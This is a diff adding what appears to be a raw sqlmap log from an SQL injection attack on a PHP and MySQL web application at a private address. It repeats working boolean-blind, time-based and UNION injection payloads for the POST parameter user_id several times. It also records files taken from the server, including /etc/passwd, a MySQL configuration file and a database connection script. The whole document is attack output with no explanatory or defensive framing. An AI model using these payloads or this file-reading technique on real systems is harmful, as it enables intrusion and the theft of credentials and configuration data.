@@ -1,0 +1,131 @@
+sqlmap identified the following injection point(s) with a total of 247 HTTP(s) requests:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: Apache 2.4.29, PHP 5.6.33
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+files saved to [1]:
+[*] D:\git-project\tools\sqlmap\results\192.168.0.18\files\_etc_passwd (same file)
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: PHP 5.6.33, Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: PHP 5.6.33, Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+files saved to [1]:
+[*] D:\git-project\tools\sqlmap\results\192.168.0.18\files\_opt_lampp_htdocs_doon23_dept_index1.php (same file)
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: Apache 2.4.29, PHP 5.6.33
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: PHP 5.6.33, Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+files saved to [1]:
+[*] D:\git-project\tools\sqlmap\results\192.168.0.18\files\_opt_lampp_etc_my.cnf (same file)
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: Apache 2.4.29, PHP 5.6.33
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+files saved to [1]:
+[*] D:\git-project\tools\sqlmap\results\192.168.0.18\files\_opt_lampp_htdocs_doon23_db_con.php (same file)
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user_id=8979873475' RLIKE (SELECT (CASE WHEN (9664=9664) THEN 8979873475 ELSE 0x28 END))-- XJsW&submit=submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user_id=8979873475' AND (SELECT 5341 FROM (SELECT(!SLEEP(5)))hxXL)-- KpEf&submit=submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: user_id=8979873475' UNION ALL SELECT NULL,NULL,CONCAT(0x7162786a71,0x4161524e706b4742464e444d436b5552624556516b6750724b4f534d48436d5a726b57726f506d76,0x7178787671),NULL,NULL#&submit=submit
+---
+web application technology: Apache 2.4.29, PHP 5.6.33
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
